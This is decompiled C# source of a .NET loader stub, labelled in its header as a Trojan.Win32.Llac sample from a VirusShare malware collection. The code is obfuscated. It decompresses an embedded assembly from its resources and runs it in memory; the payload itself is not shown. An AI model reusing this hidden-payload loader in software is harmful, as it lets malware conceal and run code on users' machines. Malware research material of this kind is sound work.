// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: syncuiLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F112AE9C-7564-463C-8834-3BB2BC4FBE1B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Llac.aamy-d1153c91831872cfeacf510426d9b4752eab5933102816559dcd2628b12a7253.exe

using SmartAssembly.SmartExceptionsCore;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;

internal class \u003CModule\u003E
{
  static \u003CModule\u003E()
  {
    \u0002.\u0001.\u0003();
    \u0001.\u0002.\u0003();
    \u0001.\u0001.\u0004();
  }

  [STAThread]
  public static int \u0003([In] string[] obj0)
  {
    int num;
    try
    {
      if (!\u0006.\u0003.\u0004())
      {
        num = -1;
      }
      else
      {
        AppDomain currentDomain = AppDomain.CurrentDomain;
        currentDomain.AssemblyResolve += new ResolveEventHandler(\u003CModule\u003E.\u0003);
        num = currentDomain.ExecuteAssemblyByName(new AssemblyName("syncui, version=1.0.0.0, culture=neutral, publickeytoken=null"), (Evidence) null, obj0);
      }
    }
    catch (Exception ex)
    {
      object[] objArray = new object[1]{ (object) obj0 };
      \u0003.\u0003.\u0003(ex, objArray);
    }
    return num;
  }

  public static Assembly \u0003([In] object obj0, [In] ResolveEventArgs obj1)
  {
    try
    {
      return \u003CModule\u003E.\u0003(Convert.ToBase64String(Encoding.Default.GetBytes(obj1.Name.ToLowerInvariant())));
    }
    catch (Exception ex)
    {
      object obj = obj0;
      ResolveEventArgs resolveEventArgs = obj1;
      throw UnhandledException.\u0003(ex, obj, (object) resolveEventArgs);
    }
  }

  public static Assembly \u0003([In] string obj0)
  {
    Stream manifestResourceStream;
    Assembly assembly1;
    int count;
    DeflateStream input1;
    try
    {
      manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(obj0);
      try
      {
        Stream input2 = manifestResourceStream;
        if (input2 == null)
        {
          assembly1 = (Assembly) null;
        }
        else
        {
          count = new BinaryReader(input2).ReadInt32();
          input1 = new DeflateStream(manifestResourceStream, CompressionMode.Decompress);
          try
          {
            assembly1 = Assembly.Load(new BinaryReader((Stream) input1).ReadBytes(count));
          }
          finally
          {
            input1?.Dispose();
          }
        }
      }
      finally
      {
        manifestResourceStream?.Dispose();
      }
      return assembly1;
    }
    catch (Exception ex)
    {
      Stream stream = manifestResourceStream;
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) count;
      DeflateStream deflateStream = input1;
      Assembly assembly2 = assembly1;
      string str = obj0;
      throw UnhandledException.\u0003(ex, (object) stream, (object) local, (object) deflateStream, (object) assembly2, (object) str);
    }
  }
}
